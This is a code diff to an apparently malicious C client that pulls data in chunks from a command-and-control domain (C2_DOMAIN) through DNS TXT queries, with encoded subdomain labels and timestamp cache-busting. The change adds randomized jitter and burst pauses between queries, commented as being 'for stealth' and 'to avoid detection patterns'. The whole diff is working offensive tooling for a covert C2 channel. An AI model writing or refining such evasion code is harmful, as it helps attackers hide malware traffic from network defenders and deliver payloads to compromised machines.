@@ -77,9 +77,15 @@
 #define DNS_TIMEOUT 10
 #define MAX_RETRIES 5
 #define RETRY_DELAY_SECONDS 3  // Increased for DNS propagation
-#define CHUNK_DELAY_MS 250  // Delay between chunk requests (milliseconds) - increased for stability
+
+// Jitter configuration for stealth
+#define MIN_CHUNK_DELAY_MS 100   // Minimum delay between chunks
+#define MAX_CHUNK_DELAY_MS 500   // Maximum delay between chunks
+#define CHUNKS_PER_BURST 10      // Number of chunks before longer pause
+#define BURST_PAUSE_MS 2000      // Pause between bursts (2 seconds)
+
 #define MAX_CHUNKS 10000  // Maximum chunks to support
-#define CHUNK_SIZE 400  // Increased chunk size to reduce total chunks (fits in DNS UDP)
+#define CHUNK_SIZE 403  // Chunk size matching server (150 bytes - UDP-safe with overhead)
 
 // DNS header structure
 typedef struct {
@@ -692,18 +698,15 @@ static int send_dns_message(const char *message, char *response, size_t response
     
     DEBUG_PRINT("[*] Encoded: %s (len=%zu)\n", encoded, strlen(encoded));
     
-    // Add timestamp for cache busting
-    snprintf(domain, sizeof(domain), "%s.%lu.%s", 
-             encoded, (unsigned long)time(NULL), C2_DOMAIN);
-    
-    DEBUG_PRINT("[*] Querying: %s\n", domain);
-    
-    // Split into DNS labels if needed (max 63 chars per label)
-    // The base36 encoded message should fit in labels naturally
-    
     // Retry mechanism with delays
     for (int attempt = 0; attempt < MAX_RETRIES; attempt++) {
     DEBUG_PRINT("[*] DNS query attempt %d/%d\n", attempt + 1, MAX_RETRIES);
+        
+        // Generate fresh timestamp for each attempt (cache busting + unique per retry)
+        snprintf(domain, sizeof(domain), "%s.%lu.%s", 
+                 encoded, (unsigned long)time(NULL), C2_DOMAIN);
+        
+        DEBUG_PRINT("[*] Querying: %s\n", domain);
         
         char txt_response[4096];
         int query_result = dns_query_txt(domain, txt_response, sizeof(txt_response));
@@ -853,7 +856,7 @@ int main(int argc, char *argv[]) {
         return 1;
     }
     
-    // Request each chunk
+    // Request each chunk with jitter for stealth
     for (int i = 0; i < total_chunks; i++) {
     DEBUG_PRINT("[*] Requesting chunk %d/%d\n", i+1, total_chunks);
         
@@ -881,13 +884,25 @@ int main(int argc, char *argv[]) {
         memcpy(chunks[i], response + 6, chunk_len + 1);
         chunk_sizes[i] = chunk_len;
         
-        // Small delay between requests to avoid overwhelming DNS
-        if (i < total_chunks - 1 && CHUNK_DELAY_MS > 0) {
+        // Add jitter between requests to avoid detection patterns
+        if (i < total_chunks - 1) {
+            // Every N chunks, take a longer pause (burst control)
+            if ((i + 1) % CHUNKS_PER_BURST == 0) {
 #ifdef _WIN32
-            Sleep(CHUNK_DELAY_MS);
+                Sleep(BURST_PAUSE_MS);
 #else
-            usleep(CHUNK_DELAY_MS * 1000);
+                usleep(BURST_PAUSE_MS * 1000);
 #endif
+            DEBUG_PRINT("[*] Burst pause (%dms)\n", BURST_PAUSE_MS);
+            } else {
+                // Random jitter between min and max delay
+                int delay = MIN_CHUNK_DELAY_MS + (rand() % (MAX_CHUNK_DELAY_MS - MIN_CHUNK_DELAY_MS + 1));
+#ifdef _WIN32
+                Sleep(delay);
+#else
+                usleep(delay * 1000);
+#endif
+            }
         }
     }
     
